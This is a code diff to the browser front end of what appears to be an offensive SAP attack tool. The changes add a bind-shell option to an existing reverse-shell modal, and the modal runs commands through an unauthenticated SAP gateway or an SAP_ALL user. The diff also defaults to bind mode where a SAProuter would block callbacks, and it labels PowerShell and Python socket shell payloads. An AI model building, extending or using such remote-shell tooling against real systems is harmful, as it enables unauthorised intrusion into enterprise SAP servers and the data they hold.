@@ -770,19 +770,28 @@ body {
 <!-- Reverse Shell Modal -->
 <div class="modal-overlay" id="shell-modal">
   <div class="modal" style="width:660px;max-width:92vw">
-    <h3>&#128279; Reverse Shell — <span id="shell-sid"></span></h3>
+    <h3>&#128279; Shell — <span id="shell-sid"></span></h3>
     <div id="shell-config">
       <div style="font-size:11px;color:#8b949e;margin-bottom:8px" id="shell-info"></div>
       <div style="display:flex;gap:8px;margin-bottom:8px">
         <div style="flex:1">
-          <label style="font-size:11px;color:#8b949e">Method</label>
+          <label style="font-size:11px;color:#8b949e">Execution Method</label>
           <select id="shell-method" style="width:100%">
             <option value="gateway">Gateway (unauthenticated)</option>
             <option value="sxpg">SXPG (via SAP_ALL user)</option>
           </select>
         </div>
         <div style="flex:1">
-          <label style="font-size:11px;color:#8b949e">Callback IP</label>
+          <label style="font-size:11px;color:#8b949e">Shell Mode</label>
+          <select id="shell-mode" style="width:100%" onchange="shellModeChanged()">
+            <option value="reverse">Reverse Shell (target connects to us)</option>
+            <option value="bind">Bind Shell (we connect to target)</option>
+          </select>
+        </div>
+      </div>
+      <div style="display:flex;gap:8px;margin-bottom:8px">
+        <div style="flex:1" id="shell-ip-row">
+          <label style="font-size:11px;color:#8b949e">Callback IP (our IP)</label>
           <input type="text" id="shell-ip" placeholder="auto-detecting..." style="width:100%">
         </div>
         <div style="width:80px">
@@ -2304,12 +2313,17 @@ async function showShellModal(sid) {
   const ipRes = await api('GET', `shell/detect_ip?target=${encodeURIComponent(host)}&saprouter=${encodeURIComponent(saprouter)}`);
   document.getElementById('shell-ip').value = ipRes.local_ip || '127.0.0.1';
 
+  // Default to bind mode for SAProuter systems (reverse often blocked)
+  const modeSel = document.getElementById('shell-mode');
+  modeSel.value = saprouter ? 'bind' : 'reverse';
+  shellModeChanged();
+
   // Payload preview
   const os = (n && n.os_type || '').toLowerCase();
   const isWin = os.includes('windows') || os.includes('nt');
   document.getElementById('shell-payload-preview').textContent =
-    isWin ? 'Payload: PowerShell TCPClient reverse shell (Windows detected)'
-          : 'Payload: Python3 socket reverse shell (Linux detected)';
+    isWin ? 'Payload: PowerShell shell (Windows detected)'
+          : 'Payload: Python3 socket shell (Linux detected)';
 
   // Reset UI state
   document.getElementById('shell-config').style.display = '';
@@ -2324,6 +2338,16 @@ async function showShellModal(sid) {
   document.getElementById('shell-modal').classList.add('visible');
 }
 
+function shellModeChanged() {
+  const mode = document.getElementById('shell-mode').value;
+  const ipRow = document.getElementById('shell-ip-row');
+  if (mode === 'bind') {
+    ipRow.style.display = 'none';  // No callback IP needed for bind
+  } else {
+    ipRow.style.display = '';
+  }
+}
+
 function shellSetStatus(state, text) {
   const dot = document.getElementById('shell-status-dot');
   const txt = document.getElementById('shell-status-text');
@@ -2335,13 +2359,14 @@ function shellSetStatus(state, text) {
 async function shellStart() {
   const sid = _shellSid;
   const method = document.getElementById('shell-method').value;
+  const shellMode = document.getElementById('shell-mode').value;
   const localIp = document.getElementById('shell-ip').value.trim();
   const port = parseInt(document.getElementById('shell-port').value) || 4444;
 
-  if (!localIp) { alert('Callback IP is required'); return; }
+  if (shellMode === 'reverse' && !localIp) { alert('Callback IP is required'); return; }
 
   const res = await api('POST', 'shell/start', {
-    sid, method, listen_port: port, local_ip: localIp
+    sid, method, shell_mode: shellMode, listen_port: port, local_ip: localIp
   });
   if (res.error) { alert(res.error); return; }
 
@@ -2351,9 +2376,15 @@ async function shellStart() {
   document.getElementById('shell-terminal').style.display = '';
   document.getElementById('shell-input-bar').style.display = 'flex';
   document.getElementById('shell-stop-btn').style.display = '';
-  shellSetStatus('waiting', `Listening on 0.0.0.0:${port} — waiting for connection...`);
-  document.getElementById('shell-terminal').textContent =
-    `[*] Reverse shell listener started on port ${port}\n[*] Payload sent to ${sid} — waiting for callback...\n`;
+  if (shellMode === 'bind') {
+    shellSetStatus('waiting', `Sending bind shell payload — will connect to ${sid}:${port}...`);
+    document.getElementById('shell-terminal').textContent =
+      `[*] Bind shell payload sent to ${sid}\n[*] Waiting for bind shell to start, then connecting to port ${port}...\n`;
+  } else {
+    shellSetStatus('waiting', `Listening on 0.0.0.0:${port} — waiting for connection...`);
+    document.getElementById('shell-terminal').textContent =
+      `[*] Reverse shell listener started on port ${port}\n[*] Payload sent to ${sid} — waiting for callback...\n`;
+  }
 
   // Start polling
   shellStartPolling();
